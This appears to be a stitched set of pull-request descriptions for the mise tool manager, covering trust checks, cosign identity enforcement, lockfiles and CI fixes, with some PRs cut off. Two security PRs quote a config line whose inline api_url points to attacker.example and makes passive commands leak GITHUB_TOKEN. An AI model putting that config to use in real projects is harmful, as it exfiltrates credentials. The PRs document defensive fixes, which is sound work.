With this change, a local Linux debug build passed both Unix cases 3/3 each, and CI passed `tasks/test_task_timeout` and `e2e-win/task_run_timeout.Tests.ps1`.

On macOS (Apple Silicon, debug build), `mise run test:e2e test_task_timeout` also passed (`All timeout tests passed!`); macOS checks liveness with `killpg` instead of `/proc`.

After the grace period, the final SIGKILL goes only to process trees mise still sees running, so a process ID freed during the grace period is not signalled again.

Not covered here:

- Tasks with `raw = true` are not in the registry of running processes that the kill uses.
- When `mise run --timeout` runs inside another mise task, or as a session leader, mise does not put tasks in their own process groups, so the timeout signals only each task's direct process. A background child that ignores SIGTERM after its shell exits keeps running, as it already does on Ctrl+C and with

title: security(backend): enforce signer identity for keyless cosign bundles
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/375
<!-- entire-trail-link-end -->

Keyless cosign verification in the aqua backend only checked that a bundle chained to Sigstore's Fulcio CA. It never checked *who* signed. Any GitHub Actions workflow, in any repository, can obtain a valid Fulcio certificate, so someone who could replace release assets (but not run the real release workflow) could substitute an artifact, `checksums.txt` and a self-signed bundle, and mise would report `✓ Cosign verified`. The `--certificate-identity*`, `--certificate-oidc-issuer` and `--certificate-github-workflow-*` options in the aqua registry were parsed but never enforced.

mise now enforces them against the signing certificate, for both current and legacy cosign bundles:

```yaml
# aqua registry entry
cosign:
  bundle: { type: github_release, asset: "{{.Asset}}.bundle" }
  opts:
    - --certificate-identity-regexp
    - '^https://github\.com/owner/repo/'
    - --certificate-oidc-issuer
    - https://token.actions.githubusercontent.com
    - --certificate-github-workflow-repository
    - owner/repo
```

A bundle signed by any other repository's workflow now fails the install. Supported options: `--certificate-identity[-regexp]`, `--certificate-oidc-issuer[-regexp]`, `--certificate-github-workflow-{repository,ref,name,trigger,sha}`; both `--flag value` and `--flag=value` work. Matching follows cosign: exact for plain flags, unanchored regex for `-regexp` flags.

## Behavior changes

- **Fails closed.** Keyless verification now requires a pinned identity (`--certificate-identity` or `--certificate-identity-regexp`), and an unrecognized or valueless `--certificate-*` option is an error rather than being ignored. Real cosign requires an identity too, so registry entries that work with the aqua CLI are unaffected. Key-based verification (`--key`) is unchanged.
- **vfox tool plugins.** A `PreInstall` attestation with `cosign_sig_or_bundle_path` and no `cosign_public_key_path` must now set `cosign_certificate_identity` or `cosign_certificate_identity_regexp` (optionally `cosign_certificate_oidc_issuer`); otherwise the plugin's attestation is rejected. Plugins that relied on keyless cosign with no identity must add one. Documented in the tool plugin guide.
- The in-process verification cache key now includes the identity so a result obtained under weaker constraints cannot satisfy a stricter one.

## Testing

- Unit tests cover opt parsing, matching against a real Fulcio certificate (accepts the real signer; rejects a different repository, a substring of the identity, a wrong issuer/repository/ref, and an invalid regex), and rejection when no identity is pinned.
- vfox tests cover the new attestation fields and the required-identity check.
- `mise run test:e2e backend/test_aqua_cosign` passes against real keyless packages (`caarlos0/fork-cleaner`, `technicalpickles/envsense`), so their registry constraints are satisfied by the real signing certifi

title: ci: give windows-unit enough time to save its cache
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/374
<!-- entire-trail-link-end -->

The `windows-unit` job on push runs (`main`, `release`, tags) can be cancelled by its own 40-minute timeout while it is still saving the Rust cache, after every test has already passed. The check then shows as cancelled, as on the 2026.10.0 release PR ([run 36879473040](https://github.com/jdx/mise/actions/runs/36879473040/job/110428469399)).

Timeline of that job:

| Time | Step |
|---|---|
| 14:53 – 15:21 | `cargo test` and `cargo test (workspace members)`, both passed |
| 15:21 | `Post Run Swatinem/rust-cache` (cache save) started |
| 15:32 | 40-minute `timeout-minutes` reached; the save was still running |
| 15:37 | job reported `cancelled` |

The tests take 25–30 minutes and the Windows cache save takes 3–15 minutes (19 of the last 300 `test.yml` runs spent over 3 minutes in it, all on Windows push runs). That leaves almost no margin under 40 minutes, and the 2026-09-29 `windows-unit` run ([36642585395](https://github.com/jdx/mise/actions/runs/36642585395)) was cut off the same way.

This raises the job's `timeout-minutes` from 40 to 60, matching `build-windows`. Pull request runs don't save the cache (`save-if` limits that to pushes on `main`, `release` and tags), so they are unaffected.

body:
## Motivation

On Windows ARM64, `mise install java@zulu-8` reported `no metadata found for version zulu-8`, leaving the queried platform unclear. The lockfile path already includes the target, such as `on windows-arm64`. no metadata found for version zulu-8

no metadata found for version zulu-8 on windows-arm64

title: fix(bootstrap): remove the deprecated --from-git alias
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/373
<!-- entire-trail-link-end -->

`mise bootstrap --from-git <repo>` and `mise bootstrap remote --from-git <repo>` no longer exist. Use `--adopt <repo>`, which has been the documented spelling since 2026.9.3.

```sh
# before (warned: "will be removed in mise 2026.10.0")
mise bootstrap --from-git git@github.com:me/dotfiles.git

# now
mise bootstrap --adopt git@github.com:me/dotfiles.git
```

The alias was hidden and its deprecation said it would go in 2026.10.0. That version bump is what turned the release PR ([#13858](https://github.com/jdx/mise/pull/13858)) red: `deprecated_at!` asserts once the running version reaches `remove_at`, which failed `adopt_accepts_both_spellings_locally_and_remotely` on macOS and Windows.

- Removes the `from_git` fields, `normalize_adopt_alias`, and the `--from-git` handling in the re-exec argument filter.
- Regenerates the flag out of `mise.usage.kdl`.
- Migrates the e2e tests that used `--from-git` to `--adopt`, and replaces the two "still works but warns" assertions with checks that `--from-git` is rejected.

## Testing

- `cargo test --bin mise cli::bootstrap` passes.
- The 20 touched e2e tests pass (`mise run test:e2e`).
- `mise run lint` fails locally only on an unrelated `unreachable_code` warning in `crates/mise-util/src/http.rs` (newer local toolchain); shfmt and shellcheck pass.

title: registry: add cloudflare-cf
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/372
<!-- entire-trail-link-end -->

Adds `cloudflare-cf`, a registry shorthand for [`cloudflare/cf`](https://github.com/cloudflare/cf), Cloudflare's new agentic CLI for the whole Cloudflare API (currently in open beta).

```sh
mise use cloudflare-cf@1.0.0-beta.10
cf --version
```

`cf` is already the Cloud Foundry CLI in the registry, so this one is named `cloudflare-cf`. It installs the `cf` and `cloudflare` binaries.

The tool is only distributed on npm (`npm i -g cf`), so the entry uses `npm:cf`. The npm package's `latest` dist-tag already points at the beta, so no registry options are needed. But `cf` is currently shipping several betas a day, and mise's default 24h `minimum_release_age` rejects a dist-tag version that new. It then falls back to the stable-only version list, and the npm name `cf` also has unrelated `0.x` releases from 2013, so an unpinned `cloudflare-cf` installs `0.15.0` (the right version resolves with `minimum_release_age = "0s"`). Until the release cadence slows or a stable `1.0.0` ships, pin the beta explicitly.

## Popularity
- GitHub: 600 stars, 22 forks, pushed 2026-10-01, latest release `cf@1.0.0-beta.10` (2026-10-01)
- Published by Cloudflare as the successor tooling for its API and `cloudflare.config.ts`

Maintainer-requested addition.

title: ci(release): comment on resolved issues and discussions with the fixing release
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/371
<!-- entire-trail-link-end -->

Issues close when their PR merges, which is days before the release that contains the fix ships. A reporter sees "closed" and has no way to tell whether to upgrade now or wait. After this change, each issue and discussion a release resolves gets a single comment naming the release:

> Fixed in [v2026.9.18](https://github.com/jdx/mise/releases/tag/v2026.9.18) by #13831. Update with `mise self-update` or see the [install docs](https://mise.jdx.dev/installing-mise.html).

## How it works

A new `comment-release-fixes` workflow runs when a stable release is published (`release: released`). `scripts/comment-release-fixes.py`:

1. Lists the PRs between the previous stable release and the new tag, from the squash-merge `(#N)` in each commit subject.
2. For each PR, collects the issues it closed (GitHub's `closingIssuesReferences`, same-repo and closed only), plus discussions named by a closing keyword (`Closes`/`Fixes`/`Resolves #N`), the same rule `link-discussion-action` uses to close a discussion. `Refs #N` is deliberately ignored, since that PR did not resolve it.
3. Posts one comment per target.

Each comment carries a hidden per-tag marker, so re-running the workflow never double-posts. A failure on one PR or item is a warning, not a failed run, and nothing here can block a release.

## Manual runs

`workflow_dispatch` takes a `tag` and a `dry_run` flag, so a release can be backfilled or previewed:

```sh
gh workflow run comment-release-fixes.yml -f tag=v2026.9.18 -f dry_run=true
```

## Validation

Ran the script in dry-run mode against the real v2026.9.18 release (31 PRs since v2026.9.17). It picked out one discussion and two issues:

```
v2026.9.18: 31 PRs since v2026.9.17
[dry run] would comment on discussion #13813 (from #13816)
[dry run] would comment on issue #13829 (from #13831)
[dry run] would comment on issue #13844 (from #13845)
```

`actionlint`, `zizmor`, and `prettier` pass on the workflow. I have not exercised the posting path against a live issue or discussion, so the first real run is the first test of that. A `dry_run=true` dispatch right after merge is the cheap way to confirm before a release.

title: security(config): require trust for .tool-versions entries with inline options
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/370
<!-- entire-trail-link-end -->

A `.tool-versions` file only needed trust when it contained Tera templates. Tool options written inline in the tool name (`tool[opt=value]`) were ignored by that check, so an untrusted project could ship:

```
github:sharkdp/fd[api_url=http://attacker.example/api/v3] latest
```

and passive commands such as `mise ls`, `env`, `current`, `outdated` and `latest` would resolve `latest` against that `api_url` and send the user's `GITHUB_TOKEN` to it as `Authorization: Bearer`, with no trust prompt. This is the `.tool-versions` counterpart of the `mise.toml` fix in #13849 and addresses GHSA-wcqh-j26q-g44x.

A `.tool-versions` entry whose tool name contains `[` now requires trust, the same as templates. Plain lines such as `node 20.0.0` still load without trust, and `[` inside a comment is ignored. The check runs before the file is parsed, both when a config is loaded normally and when tracked configs are loaded.

| command, untrusted dir with the entry above | before | after |
| --- | --- | --- |
| `mise ls`, `env`, `current`, `outdated` | token received by the host | no request; "not trusted" error |

## Not covered

- `mise install`, `exec`, `run` and `watch` deliberately trust the active config, so they are unchanged.
- `MISE_SAFE=1` skips trust checks entirely, so an inline `api_url` is still honored there. Closing that needs the GitHub token to stop being sent to arbitrary non-github.com hosts, which changes behavior for GitHub Enterprise Server users, so it is left for a follow-up.

## Testing

- New unit test `inline_tool_options_require_trust`.
- New e2e test `config/test_trust_inline_tool_options_tool_versions` runs a local sink server and asserts the four commands above fail with "not trusted" and that no `Authorization` header reaches it. It failed before the fix. The existing trust e2e tests still pass.
- `mise run lint-fix` and the workspace clippy command currently fail on warnings in `mise-util` (unused `junction` dependency, unreachable code) that this PR does not touch.

title: fix(backend): retire expired runtime symlink migration
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/369
<!-- entire-trail-link-end -->

The temporary startup migration for the 2026.4 `latest`-directory regression reached its documented 2026.10.0 removal date. In 2026.10.0, its deadline assertion prevented normal `mise install` runs from completing.

This retires the one-time startup migration and its deadline assertion. Normal install/rebuild behavior still recognizes a stale real `latest` directory and repairs it to the concrete version; passive `mise ls` no longer runs the retired cleanup.

The migration also happened to load the config before every command, which hid a bug: declining the trust prompt recorded an ignore marker but still failed the run that asked with "not trusted". With the migration gone that surfaced, so a config declined at the prompt is now skipped for that run too, as it already was on the next one.

## Validation

- `cargo fmt --check`
- `cargo check --all-features` (isolated target directory, because the workspace target has macOS Finder metadata that prevents signing its generated helper)
- `e2e/run_test cli/test_install_before_ignores_stale_latest_dirs`
- `e2e/run_test tools/test_runtime_symlink_migration`
- `e2e/run_test backend/test_ubi`

title: feat: add per-cask app directory overrides
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/368
<!-- entire-trail-link-end -->

Casks can now choose an application directory per package while retaining the global `MISE_BREW_CASK_OPT_APPDIR` default. This lets a user keep most apps in a user-writable directory while installing a cask such as 1Password in `/Applications`:

```toml
[bootstrap.packages]
"brew-cask:1password" = { appdir = "/Applications" }
```

The per-cask setting takes precedence over the global setting, expands `~/`, uses the same path safety validation, and is inherited by cask dependencies. It affects installs and upgrades only; existing apps are not moved. Other package managers ignore `appdir` with a warning.

Validation: `cargo fmt --all -- --check`, `cargo check -q`, and focused unit tests for config parsing, precedence, and `$APPDIR` binary artifacts.

*AI-assisted — Tool: Codex; model: openai/gpt-5; version: unavailable.*

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Medium Risk**
> Changes where macOS app bundles are installed and when existing apps may be replaced or removed, though guarded by validation, adopt rules, and receipt fingerprint checks.
> 
> **Overview**
> Adds a **per-cask `appdir`** option on `[bootstrap.packages]` entries so each `brew-cask:` package can install into its own Applications directory, **overriding** the global `MISE_BREW_CASK_OPT_APPDIR`. Config parsing, JSON schema, `mise bootstrap packages import`, and inherited package fallback now read and preserve `appdir`; non–brew-cask managers ignore it with a warning.
> 
> The brew-cask pipeline carries the resolved directory on each `Cask` (`appdir` field) and uses it for app/binary/`$APPDIR` target resolution, install plans, linking, and receipts. **Cask dependencies** inherit the parent’s `appdir` when they have no per-package override. Validation matches the env var (absolute path, no `..`, no filesystem root) plus `~/` expansion via `package_app_dir`.
> 
> **Install/upgrade behavior** is tightened for custom destinations: first installs into a new `appdir` refuse to replace an unrelated existing app unless `adopt = true`; explicit `appdir` changes how `requires_unowned_target` and upgrade skip logic treat receipts (including self-updating casks and appdir relocations). After a successful upgrade, **obsolete app bundles** at the old location may be removed when the receipt still owns them and fingerprints match. Casks with a per-cask `appdir` are marked **not prune-safe**.
>

body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/367
<!-- entire-trail-link-end -->

A history watcher started before the upgrade-restart safeguard cannot read tracked-directory policy fields such as `exclude`, even though the installed CLI supports them. Its captures then fail repeatedly with a raw unknown-field error.

`mise doctor`, `mise dot status`, and enrollment reporting now recognize only the legacy enrollment signature (`path`, `autosave`, `encrypt`, `variants`) when the unknown field is a known newer policy. They direct the user to run `mise bootstrap services apply` to restart the watcher on the installed mise version. Other unknown-field errors remain ordinary capture failures.

No configuration changes are required.

body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/366
<!-- entire-trail-link-end -->

The release gate evaluates as pending at the 15:00 America/Chicago cutoff, while continuing to reopen at 03:00. The workflow keeps the underlying 16:00–03:00 quiet period and uses a 60-minute look-ahead, so `release_state` becomes pending at 15:00. Scheduled refreshes aim to update the status at that cutoff, with later best-effort fallbacks.

The scheduled UTC refreshes cover both CDT and CST: 20:00 UTC is 15:00 CDT and 21:00 UTC is 15:00 CST; the :07 refreshes provide later best-effort fallbacks if an edge run is delayed or dropped.

## Validation

- Exercised the workflow's own release-state functions at 02:59, at 14:59, at 15:00, at 03:00, and at midnight for both CDT and CST; all ten cases passed.
- Ran `git diff --check`; the exact-head test, registry, and zizmor CI checks passed.
- A full `mise run lint-fix` was blocked by a missing `mbx` build-script shim in this worktree; it left no unrelated edits. The workflow-only checks above passed.

title: fix: exit with status 130 on Ctrl-C
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/365
<!-- entire-trail-link-end -->

Fixes #13860.

Pressing Ctrl-C during `mise install`, `mise upgrade`, `mise exec`, etc. made mise exit with status 1, the same as an ordinary failure. A calling shell or script couldn't tell the user had interrupted it, so in a loop like `mise upgrade; uv tool upgrade; cargo install ...` a Ctrl-C only failed the mise step and the loop carried on.

mise now exits with 130 (128 + SIGINT) after handling Ctrl-C, matching what `mise run` already did and what shells expect:

```sh
mise exec -- sleep 30   # press Ctrl-C
echo $?                 # 130 (was 1)
```

This applies to the Unix and Windows handlers. Repeated Ctrl-C during `mise run` also exits 130 now instead of 1. I went with the exit code rather than re-raising SIGINT on the process, which keeps the existing cleanup and exit path unchanged.

*AI-assisted — Tool: Claude Code; model: anthropic/claude-sonnet-5-5; version: claude-code_2-1-284_agent.*

🤖 Generated with [Claude Code](https://claude.com/claude-code)

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Low Risk**
> Behavior change is limited to process exit codes on user interrupt; no auth, data, or security paths are touched, though scripts that assumed exit `1` on Ctrl-C may need updating.
> 
> **Overview**
> **mise now exits with status `130` (128 + SIGINT) when the user finishes an interrupt with Ctrl-C**, instead of `1`, so shells and scripts can tell interruption apart from a normal failure.
> 
> Unix (`ctrlc.rs`) and Windows (`ctrlc_windows.rs`) interrupt handlers both return the new `INTERRUPTED_EXIT_CODE` on the final exit path, including repeated Ctrl-C during `mise run`.
> 
> E2E coverage is tightened: Unix `test_exit_status` expects `130` after double Ctrl-C on `mise run` and adds a `mise install` interrupt case during a postinstall hook; Windows `task_ctrl_c.Tests.ps1` keeps the child process handle and asserts exit code `130` after the second console interrupt.
>

title: fix(lock): switch backends for lock entries the config no longer resolves from
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/364
<!-- entire-trail-link-end -->

Fixes the dead end in [discussion #13852](https://github.com/jdx/mise/discussions/13852): install warns `clojure is locked to asdf:clojure, but the registry now installs it from vfox:jdx/vfox-clojure. Run `mise backends switch clojure``, and `mise backends switch clojure` then fails with `clojure not locked to a backend the registry has replaced`.

## Cause

When a lock entry's specifier no longer matches the config (for example the entry was recorded for `clojure = "1"` and the config now says `latest`), the lockfile stops supplying the version but still binds the tool's backend, so install keeps using the replaced backend and warns. `mise backends switch` only looked at requests that resolved *from* the lockfile, so it found nothing.

## Change

`mise backends switch` now also switches the lock entries for a tool that sit on a replaced backend when the request did not resolve from them, which is the same set the install warning refers to. Entries that resolved from the lockfile behave as before. An entry at a version the config no longer resolves to (an older release than the config's `latest`) is only rebound: the relock drops it and locks the config's own version on the new backend, and the command reports it as `replacing stale hk@2.3.0` rather than a switch.

```
$ mise backends switch --dry-run
would switch hk@1.58.1 from aqua:jdx/hk to packslip:github.com/jdx/hk in ~/project/mise.lock
```

Before, this printed `every tool in the project lockfile already uses the registry's backend` for that lockfile.

## Validation

Added cases to `e2e/lockfile/test_lockfile_superseded_backend` for a mismatched-specifier entry and for a stale entry at another version with artifact data; the first fails on `main`, and both pass here. Also reproduced the reported `asdf:clojure` → `vfox:jdx/vfox-clojure` case by hand with a global config and lockfile. I could not run `cargo clippy -D warnings` locally: the local toolchain trips on an unrelated `unreachable_code` warning in `crates/mise-util/src/http.rs`.

*AI-assisted — Tool: Claude Code; model: anthropic/claude-sonnet-5-5; version: 2.1.284.*

🤖 Generated with [Claude Code](https://claude.com/claude-code)

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **Medium Risk**
> Changes lockfile rewrite, relock, and reinstall paths for backend migration; incorrect stale/current handling could prune wrong versions or leave installs on the old backend.
> 
> **Overview**
> **`mise backends switch`** now picks up lock entries that still pin a **replaced** backend even when the active config no longer resolves from that entry (e.g. specifier drift), fixing the dead end where install warns to run switch but switch reports nothing to do.
> 
> Discovery walks **`superseded_entries`**: lock-resolved requests behave as before; otherwise **`Lockfile::locked_backends`** finds entries on superseded backends. **Current** vs **stale*

--- e2e/lockfile/test_lockfile_superseded_backend (+52/-0)
@@ -135,3 +135,55 @@ reset_lockfile
 mise lock --bump hk --platform "$MISE_PLATFORM"
 assert_contains "cat mise.lock" 'version = "1.58.1"'
 assert_contains "cat mise.lock" 'backend = "aqua:jdx/hk"'
+
+echo "=== an entry the request no longer resolves from still switches ==="
+# The entry's specifier does not match the config, so the lockfile no longer
+# supplies the version, but it still binds the backend and install warns.
+cat <<'TOML' >mise.toml
+[tools]
+hk = "1"
+TOML
+cat <<'EOF2' >mise.lock
+lockfile_version = 2
+
+[[tools.hk]]
+version = "1.58.1"
+backend = "aqua:jdx/hk"
+specifiers = ["1.58"]
+EOF2
+assert_contains "mise backends switch --dry-run 2>&1" 'would switch hk@1.58.1 from aqua:jdx/hk to packslip:github.com/jdx/hk'
+mise backends switch hk
+assert_contains "cat mise.lock" 'backend = "packslip:github.com/jdx/hk"'
+assert_not_contains "cat mise.lock" 'aqua:jdx/hk'
+
+echo "=== a stale entry at another version, with artifact data, still switches ==="
+# The request resolves to a newer hk, so the stale entry only rebinds the
+# backend: the relock drops it and locks the config's own version on the new
+# backend, without pinning the config to the stale version.
+cat <<TOML >mise.toml
+[tools]
+hk = "2"
+TOML
+cat <<EOF2 >mise.lock
+lockfile_version = 2
+
+[[tools.hk]]
+version = "2.3.0"
+backend = "aqua:jdx/hk"
+specifiers = ["2.3"]
+
+[tools.hk."platforms.$MISE_PLATFORM"]
+url = "https://github.com/jdx/hk/releases/download/v2.3.0/placeholder"
+EOF2
+assert_contains "mise backends switch --dry-run 2>&1" 'would replace stale hk@2.3.0 (aqua:jdx/hk)'
+# The version the config resolves to is installed from the locked backend,
+# and the switch reinstalls it from the new one.
+mise install
+assert_contains "cat $MISE_DATA_DIR/installs/hk/.mise.backend.toml" 'full = "aqua:jdx/hk"'
+mise backends switch hk
+assert_contains "cat $MISE_DATA_DIR/installs/hk/.mise.backend.toml" 'full = "packslip:github.com/jdx/hk"'
+assert_not_contains "cat mise.lock" 'aqua:jdx/hk'
+assert_not_contains "cat mise.lock" 'placeholder'
+assert_not_contains "cat mise.lock" 'version = "2.3.0"'
+assert_contains "cat mise.lock" 'backend = "packslip:github.com/jdx/hk"'
+assert_contains "cat mise.lock" "[tools.hk.\"platforms.$MISE_PLATFORM\"]"

title: fix(aqua): install the registry's gnu build on musl hosts instead of requiring a musl asset
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/362
<!-- entire-trail-link-end -->

On a musl Linux host such as Alpine, installing an aqua tool whose registry entry names only a glibc build failed, and the tool's `libc = "gnu"` option didn't help:

```toml
[tools]
"aqua:zizmorcore/zizmor" = { version = "latest", libc = "gnu" }
```

```
Failed to install aqua:zizmorcore/zizmor@latest: no asset found: zizmor-x86_64-unknown-linux-musl.tar.gz
  Available assets:
  ...
  zizmor-x86_64-unknown-linux-gnu.tar.gz
```

zizmor's registry entry names `unknown-linux-gnu` and the release ships no musl build, but mise rewrote the name to `unknown-linux-musl` and required a musl asset. A platform that names its libc wins over the tool's `libc` option, so the option was ignored.

Now a musl platform that nothing asked for installs the asset the registry names. The zizmor config above installs `zizmor-x86_64-unknown-linux-gnu.tar.gz` on Alpine, and so does the same config without `libc`. The binary still needs glibc or gcompat in the container to run.

What stays the same:
- A tool's `libc = "musl"` and `libc = "musl"` in settings still select the musl build, strictly.
- A platform that names musl (a musl host or a `linux-x64-musl` lockfile platform) still wins over a tool's `libc = "glibc"`. It now means "use what the registry lists" rather than "rewrite to musl".
- Glibc hosts are unaffected.
- Lockfiles follow the same rule for the same platform: `mise lock` for `linux-x64-musl` records the registry's gnu asset for a gnu-only entry, exactly what an Alpine host installs. A lockfile that already records the musl sibling of a gnu asset stays valid.

One behavior change: on Alpine, a registry entry that names gnu but whose release also ships a musl build now installs the gnu build, where mise used to switch to musl. Set `libc = "musl"` on that tool to get the musl build.

## Validation

- Alpine container with glibc installed (`/etc/os-release` says `alpine`, so mise detects musl), zizmor 1.30.1:
  - mise 2026.9.16 fails with the error above, with and without `libc = "gnu"`.
  - This branch installs `zizmor-x86_64-unknown-linux-gnu.tar.gz` and `zizmor --version` prints `1.30.1`, with and without `libc = "gnu"`.
- New case in `e2e/backend/test_aqua_libc`: a gnu-only registry entry locked for `linux-x64-musl` keeps the gnu URL. Existing libc unit tests updated and pass (`cargo test --lib backend::aqua`).
- I did not test plain Alpine without glibc or gcompat. Local clippy stops on errors in files this PR doesn't touch (`crates/mise-util/src/http.rs`, `src/system/packages/mod.rs`); none are in `src/backend/aqua.rs`.

Fixes #13851

title: fix(backend): trust SLSA provenance recorded in a lockfile
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/361
<!-- entire-trail-link-end -->

Since 2026.9.17, a lockfile that records a checksum and SLSA provenance fails to install when the registry entry has no signer, e.g. `aqua:google/osv-scanner` or `aqua:fluxcd/flux2`:

```text
Lockfile requires SLSA provenance for aqua:google/osv-scanner@2.6.0,
but Aqua registry metadata has no signer_identity and signer_issuer.
```

A lockfile that records a checksum and provenance is trusted: installing from it checks the artifact digest and verifies nothing else. The aqua and github backends already did this for every provenance type except SLSA, which #13725 made re-verify against the current signer. This removes that exception, so the locks from the report install again. `locked_verify_provenance` (or paranoid mode) still re-verifies provenance, and then the signer is required.

This PR also adds `slsa_signer_identity` and `slsa_signer_issuer` tool options to the aqua backend, matching the github backend. They let `mise lock` verify and record SLSA for a package whose registry entry has no signer:

```toml
[tools]
"aqua:google/osv-scanner" = { version = "2.6.0", slsa_signer_identity = "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v2.1.0", slsa_signer_issuer = "https://token.actions.githubusercontent.com" }
```

- Both options are required together, must be non-empty strings, and replace any registry signer, including in version overrides.
- A lock with no checksum, or a forced re-verification, still fails clearly when there is no signer.
- The vfox backend is unchanged: it doesn't store a checksum in the lock, so there is nothing to trust.
- This supersedes the checksum-fallback approach in #13854 for aqua by not needing a fallback or warning at all.

Fixes #13850

## Testing

- New offline e2e `backend/test_aqua_slsa_locked` uses a local registry and archive and a lock that records SLSA. It installs without a signer, and fails with the signer message under `MISE_LOCKED_VERIFY_PROVENANCE=1`. It fails with the error from the report when the old condition is restored.
- `lockfile/test_lockfile_provenance` is updated for the trusted behavior, and it and `backend/test_aqua_slsa` pass against real releases.
- Unit tests cover the signer options, and `cargo test --lib backend::` passes.
- Workspace clippy with `-D warnings` already fails on an unreachable-code error in `crates/mise-util/src/http.rs`, which this PR does not touch. There are no clippy warnings in the changed files.

title: docs: add a releases page with a timeline of release sizes and resolved issues
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/360
<!-- entire-trail-link-end -->

The docs had no way to see how fast mise ships, how big each release is, or what was in it. This adds a **Releases** page (`/releases`, under About): a timeline of every release since 2024.11, sized by the number of changes in each, where each release expands to show the notes published with it on GitHub.

![The Releases page: totals, a changes-per-release timeline, an issues-per-release chart, and the newest months listed below](https://raw.githubusercontent.com/jdx/mise/c1e7287b51ed4a73917a447b0d6ab277e2f8a556/.github/pr-assets/releases-page.png)

- **Timeline:** one bar per release, oldest on the left, height = changes in its changelog. Hover or focus a bar for the version, date, change count, issue count and a features/fixes/registry/other split. Clicking a bar opens that release's notes.
- **Release notes:** each release in the list expands in place to show its GitHub release notes (the communique version: summary, Changed/Added/Fixed, examples with highlighted code blocks). `/releases#2026.9.17` opens a release directly.
- **Issues chart:** issues resolved per release, **starting 2026-09-23**, when GitHub Issues were turned back on (the first issue after the gap was #13523, opened that day). Earlier releases show a dash.
- **Header link:** the version in the nav bar (`v2026.9.17`) now goes to that release on this page, `/releases#2026.9.17`, instead of the GitHub releases list.
- **Totals:** 414 releases, 6,052 changes, 21 issues resolved since Sep 23, 2026.

![Release 2026.9.17 expanded to show its release notes](https://raw.githubusercontent.com/jdx/mise/2aa6c9438004a150e13b5dc8d2c16762841fb683/.github/pr-assets/releases-notes.png)

## Where the code and data come from

The page's code is the published npm package [`@jdxcode/docs-releases`](https://github.com/jdx/docs-releases) (added here at `0.1`), so the other jdx projects can use the same page. mise supplies only its settings, under `"docs-releases"` in the root `package.json` (repo, the date issue counts start, the issues file, and the sponsor block and Aqua sections to leave out), a 7-line data loader in `docs/releases.data.ts`, and `...releaseNotesPlugin()` in the VitePress config.

- **Changes** are the entries in `CHANGELOG.md`. New Contributors and the vendored Aqua registry sections are left out of the count, since the Aqua sections would otherwise dwarf every real change.
- **Release notes** are the GitHub release bodies. `xtasks/release-plz` runs `docs-releases sync` on every release, which writes each published release's notes to `release-notes/<version>.md` (394 files, about 1.1 MB, rewritten only if a release is edited; the sponsor block release.yml appends is left out). The docs build reads those files, so it does not fetch every release.
  - The release a release PR will publish has no notes yet, so the docs build fetches any release newer than the newest snapshot fr

title: security(config): require trust for tool keys with inline options
body:
<!-- entire-trail-link-start -->
https://entire.io/gh/jdx/mise/trails/359
<!-- entire-trail-link-end -->

A `mise.toml` that only lists tools with plain version strings loads without trust. That check only looked at the `[tools]` values, but tool options can also be written inline in the key:

```toml
[tools]
"github:sharkdp/fd[api_url=http://attacker.example/api/v3]" = "latest"
```

The value is a plain string, so the file was treated as safe and loaded in an untrusted directory. Commands that don't auto-trust the config (`mise ls`, `mise env`, `mise current`, `mise outdated`, `mise upgrade --dry-run`, `mise latest`) then resolved `latest` against the config's `api_url` and sent the user's `GITHUB_TOKEN` to it as `Authorization: Bearer`.

Tool keys with inline options (any key containing `[`) now require trust, the same as `{ ... }` option tables already did. Plain keys such as `node` or `"cargo:eza"` still load without trust.

## Before / after

Sink server on `127.0.0.1` logging requests, a fake `GITHUB_TOKEN`, a clean `HOME`, and the config above in an untrusted project:

| command | before | after |
| --- | --- | --- |
| `mise ls`, `env`, `current`, `outdated`, `upgrade --dry-run`, `latest github:sharkdp/fd` | token received | no request; trust error |

## Not covered

- `mise install`, `exec`, `run`, and `watch` deliberately trust the active config, so they are unchanged.
- `MISE_SAFE=1` skips trust checks entirely, so an inline `api_url` is still honored there. Closing that needs the GitHub token to stop being sent to arbitrary non-github.com hosts, which changes behavior for GitHub Enterprise Server users who rely on `GITHUB_TOKEN`, so it is left for a follow-up.

## Testing

`test_is_safe_config_body` gains cases for inline options in a tool key. I also checked the before/after table above against a debug build of this branch.

*AI-assisted — Tool: Claude Code; model: anthropic/claude-sonnet-5-5; version: 2.1.284.*

🤖 Generated with [Claude Code](https://claude.com/claude-code)

<!-- CURSOR_SUMMARY -->
---

> [!NOTE]
> **High Risk**
> Security fix for credential exfiltration via untrusted configs; behavior change only for inline option keys that were incorrectly auto-trusted.
> 
> **Overview**
> Closes a trust bypass where `[tools]` entries like `"github:owner/repo[api_url=...]" = "latest"` were treated as **safe** because only the value was checked. Untrusted projects could redirect GitHub API calls and leak `GITHUB_TOKEN` on commands such as `mise ls`, `env`, `current`, and `outdated`.
> 
> **`is_safe_config_body`** now rejects any `[tools]` key containing `[` (inline options), matching the existing rule for option tables. Plain tool names are unchanged. The trust FAQ documents inline options, unit tests cover the new cases, and an e2e test asserts those commands fail with “not trusted” and never hit a malicious `api_url`.
> 
> <sup>Reviewed by [Cursor Bugbot](https://cursor.com/bugbot) for commit f7d3fc3d57e67f159939a674a4743719b8ff42

+#!/usr/bin/env bash

